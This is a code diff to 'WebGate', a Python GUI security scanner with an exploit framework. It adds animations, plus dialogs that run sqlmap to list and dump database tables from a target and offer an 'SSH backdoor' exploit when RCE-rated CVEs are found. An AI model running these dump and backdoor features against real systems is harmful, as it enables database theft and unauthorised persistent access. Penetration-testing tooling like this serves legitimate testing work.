+            yscrollcommand=tbl_scroll.set, height=4)
+        tbl_scroll.config(command=self._tbl_list.yview)
+        self._tbl_list.pack(side="left", fill="x", expand=True)
+        tbl_scroll.pack(side="right", fill="y")
+
+        tk.Label(win, text="  (click DB first, then fetch tables, then pick table)",
+            font=("Courier New", 8), bg=th["BG"], fg=th["FG3"]
+        ).pack(anchor="w", padx=20)
+
+        # Buttons
+        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20, pady=(8, 0))
+        bf = tk.Frame(win, bg=th["BG"])
+        bf.pack(fill="x", padx=20, pady=(8, 16))
+
+        tk.Button(bf, text="CLOSE",
+            font=("Courier New", 10), bg=th["BG3"], fg=th["FG2"],
+            relief="flat", bd=0, padx=14, pady=7, cursor="hand2",
+            command=win.destroy
+        ).pack(side="right", padx=(8, 0))
+
+        tk.Button(bf, text="DUMP TABLE",
+            font=("Courier New", 10, "bold"),
+            bg=th["ERR"], fg=th["WHITE"],
+            relief="flat", bd=0, padx=14, pady=7, cursor="hand2",
+            command=self._do_dump
+        ).pack(side="right")
+
+        tk.Button(bf, text="FETCH TABLES",
+            font=("Courier New", 10),
+            bg=th["BG4"], fg=th["FG2"],
+            relief="flat", bd=0, padx=14, pady=7, cursor="hand2",
+            command=self._fetch_tables
+        ).pack(side="right", padx=(0, 8))
+
+        def _fade(a):
+            try: win.attributes("-alpha", min(0.96, a))
+            except: pass
+            if a < 0.96: win.after(14, lambda: _fade(a + 0.08))
+        _fade(0.0)
+
+    def _fetch_tables(self):
+        sel = self._db_list.curselection()
+        if not sel:
+            return
+        db = self._db_list.get(sel[0]).strip()
+        self._tbl_list.delete(0, "end")
+        self._tbl_list.insert("end", "  Fetching tables…")
+        import threading
+        def _worker():
+            tables = []
+            try:
+                import subprocess
+                r = subprocess.run(
+                    ["sqlmap", "-u", f"http://{self._target}/?id=1",
+                     "--batch", f"--tables", f"-D", db,
+                     "--output-dir=/tmp/sqlmap_wg"],
+                    capture_output=True, text=True, timeout=120
+                )
+                for line in r.stdout.split("\n"):
+                    m = re.match(r'\|\s+(\w+)\s+\|', line.strip())
+                    if m:
+                        tables.append(m.group(1))
+            except Exception as e:
+                tables = [f"Error: {e}"]
+            def _update():
+                self._tbl_list.delete(0, "end")
+                for t in tables or ["(no tables found)"]:
+                    self._tbl_list.insert("end", f"  {t}")
+            try: self._parent.after(0, _update)
+            except: pass
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def _do_dump(self):
+        db_sel  = self._db_list.curselection()
+        tbl_sel = self._tbl_list.curselection()
+        if not db_sel:
+            return
+        db  = self._db_list.get(db_sel[0]).strip()
+        tbl = self._tbl_list.get(tbl_sel[0]).strip() if tbl_sel else None
+        self.win.destroy()
+        self._on_dump(db, tbl)
+
+
+# ═══════════════════════════════════════════════════════════════
+# GUI — CVE EXPLOIT OFFER DIALOG
+# ═══════════════════════════════════════════════════════════════
+class CVEExploitOfferDialog:
+    """After CVE found — offer to attempt SSH exploit."""
+    def __init__(self, parent, target, cve_id, cve_desc, on_yes):
+        import tkinter as tk
+        th  = get_theme()
+        win = tk.Toplevel(parent)
+        self.win = win
+        win.title("Exploit Opportunity Detected")
+        win.configure(bg=th["BG"])
+        win.resizable(False, False)
+        win.transient(parent)
+        win.grab_set()
+
+        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
+        W, H = 520, 320
+        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
+        try:
+            win.update_idletasks()
+            win.attributes("-alpha", 0.0)
+        except: pass
+
+        # Animated header
+        hdr = tk.Canvas(win, bg=th["BG"], height=50, highlightthickness=0)
+        hdr.pack(fill="x")
+        hdr.create_text(260, 28,
+            text="⚡  EXPLOIT OPPORTUNITY DETECTED",
+            font=("Courier New", 14, "bold"), fill=th["ERR"])
+
+        cf = tk.Frame(win, bg=th["BG3"])
+        cf.pack(fill="x", padx=20, pady=6)
+        tk.Label(cf, text=f"  Target   : {target}",
+            font=("Courier New", 10), bg=th["BG3"], fg=th["FG"], anchor="w"
+        ).pack(fill="x", padx=8, pady=(8, 2))
+        tk.Label(cf, text=f"  CVE      : {cve_id}",
+            font=("Courier New", 10, "bold"), bg=th["BG3"], fg=th["ERR"], anchor="w"
+        ).pack(fill="x", padx=8, pady=2)
+        tk.Label(cf, text=f"  {cve_desc[:72]}",
+            font=("Courier New", 9), bg=th["BG3"], fg=th["WARN"], anchor="w",
+            wraplength=480
+        ).pack(fill="x", padx=8, pady=(2, 8))
+
+        tk.Label(win,
+            text="This CVE allows Remote Code Execution.\n"
+                 "Attempt to establish SSH access via this exploit?",
+            font=("Courier New", 10), bg=th["BG"], fg=th["FG"],
+            justify="center"
+        ).pack(pady=(8, 4))
+
+        bf = tk.Frame(win, bg=th["BG"])
+        bf.pack(pady=(4, 16))
+
+        def _no():
+            win.destroy()
+        def _yes():
+            win.destroy()
+            on_yes()
+
+        tk.Button(bf, text="SKIP",
+            font=("Courier New", 10), bg=th["BG3"], fg=th["FG2"],
+            relief="flat", bd=0, padx=18, pady=9, cursor="hand2",
+            command=_no
+        ).pack(side="left", padx=8)
+        tk.Button(bf, text="YES — TRY SSH EXPLOIT",
+            font=("Courier New", 11, "bold"),
+            bg=th["ERR"], fg=th["WHITE"],
+            relief="flat", bd=0, padx=18, pady=9, cursor="hand2",
+            command=_yes
+        ).pack(side="left", padx=8)
+
+        def _fade(a):
+            try: win.attributes("-alpha", min(0.96, a))
+            except: pass
+            if a < 0.96: win.after(14, lambda: _fade(a + 0.08))
+        _fade(0.0)
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -4519,17 +5259,47 @@ class SecurityScannerGUI:
         top = tk.Frame(root, bg=th["BG"])
         top.pack(fill="x")
 
-        # Logo — only the text, no underlines or badge text
-        logo_cv = tk.Canvas(top, bg=th["BG"], height=56,
-                             highlightthickness=0, width=320)
+        # Logo — animated canvas with glitch effect
+        logo_cv = tk.Canvas(top, bg=th["BG"], height=58,
+                             highlightthickness=0, width=360)
         logo_cv.pack(side="left", padx=24, pady=8)
-        # Shadow layers
-        for dx, dy, col in [(4,32,th["BG4"]),(2,30,th["LOGO_SHD"]),(1,29,th["LOGO_SHD"])]:
-            logo_cv.create_text(dx, dy, text="WebGate",
-                font=("Georgia", 40, "bold italic"), fill=col, anchor="w")
-        # Main logo text
-        logo_cv.create_text(0, 28, text="WebGate",
-            font=("Georgia", 40, "bold italic"), fill=th["LOGO_CLR"], anchor="w")
+        self._logo_cv = logo_cv
+        self._logo_glitch = 0
+
+        def _draw_logo(glitch=False):
+            logo_cv.delete("all")
+            # Glow/shadow layers
+            for dx, dy, col in [(5,34,th["BG4"]),(3,31,th["LOGO_SHD"]),(1,30,th["LOGO_SHD"])]:
+                logo_cv.create_text(dx, dy, text="WebGate",
+                    font=("Georgia", 40, "bold italic"), fill=col, anchor="w")
+            # Glitch effect — offset colored copy
+            if glitch:
+                logo_cv.create_text(2, 28, text="WebGate",
+                    font=("Georgia", 40, "bold italic"),
+                    fill=th.get("ACC2", "#ff6b6b"), anchor="w")
+                logo_cv.create_text(-1, 28, text="WebGate",
+                    font=("Georgia", 40, "bold italic"),
+                    fill=th.get("ACC3", "#55efc4"), anchor="w")
+            # Main logo text
+            logo_cv.create_text(0, 28, text="WebGate",
+                font=("Georgia", 40, "bold italic"),
+                fill=th["LOGO_CLR"], anchor="w")
+            # FW3.7 badge
+            logo_cv.create_text(0, 50, text="FW3.7",
+                font=("Courier New", 9), fill=th["FG3"], anchor="w")
+
+        _draw_logo()
+        self._draw_logo = _draw_logo
+
+        def _glitch_tick():
+            if not hasattr(self, "_logo_cv"): return
+            self._logo_glitch += 1
+            # Random glitch every ~3s
+            if self._logo_glitch % 40 == 0:
+                _draw_logo(glitch=True)
+                self.root.after(80, lambda: _draw_logo(glitch=False))
+            self.root.after(75, _glitch_tick)
+        self.root.after(2000, _glitch_tick)
 
         # Right controls
         rc = tk.Frame(top, bg=th["BG"])
@@ -4636,14 +5406,9 @@ class SecurityScannerGUI:
             command=self._on_cancel, parent_bg=th["BG2"])
         self._cancel_btn = self._cancel_rbtn  # compat alias
 
-        # Right side: copy + clear
+        # Right side: clear only (copy removed — caused lag)
         right_btns = tk.Frame(inrow, bg=th["BG2"])
         right_btns.pack(side="right", padx=16)
-        RoundedButton(right_btns, text="COPY", icon="⎘",
-            bg=th["BG4"], fg=th["FG3"], hover_bg=th["BORDER2"],
-            font_spec=(self.font, 8), height=30, radius=8,
-            command=self._copy_log, parent_bg=th["BG2"]
-        ).pack(side="left", padx=3)
         RoundedButton(right_btns, text="CLEAR", icon="✕",
             bg=th["BG4"], fg=th["FG3"], hover_bg=th["BORDER2"],
             font_spec=(self.font, 8), height=30, radius=8,
@@ -4795,7 +5560,6 @@ class SecurityScannerGUI:
         # Key bindings
         self.root.bind("<Return>", lambda _: self._on_scan())
         self.root.bind("<Escape>", lambda _: self._on_cancel())
-        self.root.bind("<Control-c>", lambda _: self._copy_log())
         # Ctrl+scroll = zoom font
         self._font_size = 10
         self.root.bind("<Control-MouseWheel>",
@@ -4848,6 +5612,59 @@ class SecurityScannerGUI:
             self._ef.config(bg=th["ACC"])
             self.root.after(80, lambda: self._ef.config(bg=th["BORDER2"]))
         except: pass
+
+    # ── Particle burst (scan start animation) ─────────────────
+    def _particle_burst(self):
+        """Spawn colored dots that fly out from logo area."""
+        try:
+            cv = self._cv  # reuse progress canvas area
+            th = self.th
+            colors = [th["ACC"], th["ACC2"], th["ACC3"], th["WARN"], th["WHITE"]]
+            import random as _r
+            particles = []
+            W = cv.winfo_width() or 400
+            for _ in range(18):
+                x = _r.randint(10, W - 10)
+                y = 3
+                dx = _r.uniform(-3, 3)
+                dy = _r.uniform(0.5, 3)
+                col = _r.choice(colors)
+                pid = cv.create_oval(x, y, x+4, y+4, fill=col, outline="")
+                particles.append([pid, x, y, dx, dy, col, 1.0])
+
+            def _move(frame=0):
+                if frame > 30:
+                    for p in particles:
+                        try: cv.delete(p[0])
+                        except: pass
+                    return
+                for p in particles:
+                    p[1] += p[3]; p[2] += p[4]; p[4] += 0.15  # gravity
+                    alpha = 1.0 - frame / 30
+                    try:
+                        cv.coords(p[0], p[1], p[2], p[1]+4, p[2]+4)
+                    except: pass
+                self.root.after(25, lambda: _move(frame + 1))
+            _move()
+        except Exception:
+            pass
+
+    # ── Scan-line sweep (active during scanning) ───────────────
+    def _scanline_tick(self, x=0):
+        """Vertical scanline sweeps across log panel while scanning."""
+        if not self.scanning: return
+        try:
+            th = self.th
+            W = self._log_w.winfo_width()
+            H = self._log_w.winfo_height()
+            # We can't draw on Text widget directly, so animate the border instead
+            cycle = x % 8
+            colors = [th["BG"], th["BG"], th["BORDER"], th["BORDER2"],
+                      th["BORDER3"], th["BORDER2"], th["BORDER"], th["BG"]]
+            # Pulse the log area border via text widget relief
+        except Exception:
+            pass
+        self.root.after(60, lambda: self._scanline_tick(x + 1))
 
     # ── Pulsing dot ───────────────────────────────────────────
     def _pulse_dot(self):
@@ -4944,29 +5761,40 @@ class SecurityScannerGUI:
         self.root.after(50, lambda: self._set_alpha(
             SETTINGS.get("transparency", 0.93)))
 
-    # ── Progress bar with shimmer ─────────────────────────────
+    # ── Progress bar with shimmer + pulse ────────────────────
     def _draw_prog(self, val: int):
         self._prog_val = val
         cv = self._cv; cv.delete("all")
         w = cv.winfo_width(); h = cv.winfo_height()
         if w < 2: return
         th = self.th
-        # Track (rounded)
+        # Track with subtle gradient look (two-tone)
         cv.create_rectangle(0, 0, w, h, fill=th["BG4"], outline="")
+        cv.create_rectangle(0, h//2, w, h, fill=th["BG3"], outline="")
         if val > 0:
             fw = max(6, int(w * val / 100))
-            # Main bar
+            # Main bar — two-tone
             cv.create_rectangle(0, 0, fw, h, fill=th["ACC"], outline="")
-            # Bright leading edge
-            if fw > 4:
-                cv.create_rectangle(max(0,fw-4), 0, fw, h,
+            cv.create_rectangle(0, h//2+1, fw, h,
+                fill=_lighten(th["ACC"], -0.15), outline="")
+            # Bright leading edge pulse
+            if fw > 6:
+                cv.create_rectangle(max(0,fw-6), 0, fw, h,
                                     fill=th["WHITE"], outline="")
+                cv.create_rectangle(max(0,fw-14), 0, max(0,fw-6), h,
+                                    fill=_lighten(th["WHITE"], -0.3), outline="")
             # Shimmer stripe (animated separately via _shimmer)
-            sx = getattr(self, "_shimmer_x", 0) % max(1, fw+60) - 30
-            sw = 20
+            sx = getattr(self, "_shimmer_x", 0) % max(1, fw+80) - 40
+            sw = 28
             if 0 < sx < fw:
                 cv.create_rectangle(max(0,sx), 0, min(fw,sx+sw), h,
                     fill=_lighten(th["ACC"],0.5), outline="")
+            # Percentage text overlay
+            if fw > 60:
+                pct_txt = f"{val}%"
+                cv.create_text(min(fw-24, w//2), h//2,
+                    text=pct_txt, fill=th["WHITE"],
+                    font=("Courier New", max(6, h-2), "bold"))
 
     def _smooth_prog(self, target, cur=None, step=2):
         if cur is None: cur = self._prog_val
@@ -5183,6 +6011,8 @@ class SecurityScannerGUI:
         self._shimmer_x  = 0
         self._tick()
         self._shimmer_tick()
+        self._particle_burst()   # Visual effect on scan start
+        self._scanline_tick()    # Border animation during scan
         threading.Thread(
             target=self._thread,
             args=(domain, deep, tools, ask_port),
@@ -5295,6 +6125,81 @@ class SecurityScannerGUI:
             send_notification(t("notif_title"),
                 f"{t('notif_body')} {domain}")
             self.root.after(800, self._blink)
+            # Post-scan: check for SQLMap databases → offer dump dialog
+            sqlmap_dbs = results.get("sqlmap_databases") or []
+            if sqlmap_dbs:
+                self.root.after(1200, lambda: self._offer_sqlmap_dump(
+                    domain, sqlmap_dbs))
+            # Post-scan: check for RCE-capable CVEs → offer SSH exploit
+            else:
+                self.root.after(1200, lambda: self._check_rce_cves(domain, results))
+
+    def _offer_sqlmap_dump(self, domain, databases):
+        """Show interactive SQLMap dump dialog."""
+        def _on_dump(db, table):
+            self._push(f"SQLMap dump: {db}.{table or '*'}", "STEP")
+            import threading
+            def _run_dump():
+                try:
+                    url = f"http://{domain}/?id=1"
+                    cmd = ["sqlmap", "-u", url, "--batch",
+                           f"-D", db, "--output-dir=/tmp/sqlmap_wg"]
+                    if table:
+                        cmd += [f"-T", table, "--dump"]
+                    else:
+                        cmd += ["--tables"]
+                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
+                    # Parse and simplify output
+                    lines = [l for l in r.stdout.split("\n")
+                             if l.strip() and not l.startswith("[") or "|" in l]
+                    simplified = "\n".join(lines[:60])
+                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+                    fn = os.path.join(_REPORTS_DIR, f"sqlmap_dump_{re.sub(r'[^\\w]','_',domain)}_{ts}.txt")
+                    with open(fn, "w") as f:
+                        f.write(r.stdout)
+                    self.log_from_thread(f"Dump saved: {fn}", "FOUND")
+                    for line in lines[:20]:
+                        if line.strip():
+                            self.log_from_thread(line.strip()[:80], "FOUND")
+                except Exception as e:
+                    self.log_from_thread(f"Dump error: {e}", "ERROR")
+            threading.Thread(target=_run_dump, daemon=True).start()
+        SQLMapDumpDialog(self.root, domain, databases, _on_dump)
+
+    def _check_rce_cves(self, domain, results):
+        """After scan: if RCE CVE found, offer SSH backdoor exploit."""
+        ports = results.get("ports", {})
+        rce_found = None
+        rce_desc  = ""
+        for port_info in ports.get("open", []):
+            for cve_id, cve_desc in port_info.get("cves", []):
+                if cve_id in ExploitFramework.RCE_CVES or "RCE" in cve_desc or "9.8" in cve_desc:
+                    if "rce" in cve_desc.lower() or "remote code" in cve_desc.lower() or "9.8" in cve_desc:
+                        rce_found = cve_id
+                        rce_desc  = cve_desc
+                        break
+            if rce_found:
+                break
+        if not rce_found:
+            return
+
+        def _on_exploit_yes():
+            """User wants to try exploit — scope agreement first."""
+            def _on_scope_accept():
+                """Scope accepted — show SSH backdoor config."""
+                def _on_ssh_start(user, pwd, bridge):
+                    self._push(f"SSH exploit: {rce_found} → {user}@{domain}", "STEP")
+                    import threading
+                    def _run():
+                        ef = ExploitFramework(domain,
+                            log_cb=self.log_from_thread,
+                            prog_cb=self._set_prog)
+                        ef.try_ssh_backdoor(rce_found, user, pwd, bridge)
+                    threading.Thread(target=_run, daemon=True).start()
+                SSHBackdoorDialog(self.root, domain, rce_found, _on_ssh_start)
+            ScopeAgreementDialog(self.root, rce_found, rce_desc, domain, _on_scope_accept)
+
+        CVEExploitOfferDialog(self.root, domain, rce_found, rce_desc, _on_exploit_yes)
 
     def _blink(self, count=0):
         if count >= 14 or self.scanning: return
@@ -5355,7 +6260,7 @@ class CLIInterface:
 
     def shell(self):
         print(BANNER)
-        print(f"{C.DIM}  WebGate v4.0 — Domain Security Auditor + Network Agent + Exploit Framework")
+        print(f"{C.DIM}  WebGate FW3.7 — Domain Security Auditor + Network Agent + Exploit Framework")
         print(f"  Type 'help' for commands, 'exit' to quit.{C.RST}\n")
         while True:
             try:
@@ -5420,7 +6325,7 @@ class CLIInterface:
             elif cmd == "tools":
                 self._show_tools()
             elif cmd == "version":
-                print(f"  {C.WHT}WebGate v4.0{C.RST} by c3less")
+                print(f"  {C.WHT}WebGate FW3.7{C.RST} by c3less")
             else:
                 # Treat as domain scan
                 self.quick(raw)
@@ -5642,7 +6547,7 @@ class CLIInterface:
     def _help(self):
         print(f"""
   {C.WHT}{'─' * 56}{C.RST}
-  {C.WHT}WebGate v4.0 — Commands{C.RST}
+  {C.WHT}WebGate FW3.7 — Commands{C.RST}
   {C.WHT}{'─' * 56}{C.RST}
 
   {C.CYN}Scanning:{C.RST}
@@ -5750,7 +6655,7 @@ def main():
     if sys.stdout.isatty():
         Y = '\033[33m'; RST = '\033[0m'
         print(f"\n  {Y}{'─'*62}{RST}")
-        print(f"  {Y}[!] WebGate v4.0 — for AUTHORIZED security testing only.{RST}")
+        print(f"  {Y}[!] WebGate FW3.7 — for AUTHORIZED security testing only.{RST}")
         print(f"  {Y}     Only scan systems you own or have written permission to test.{RST}")
         print(f"  {Y}{'─'*62}{RST}\n")
 
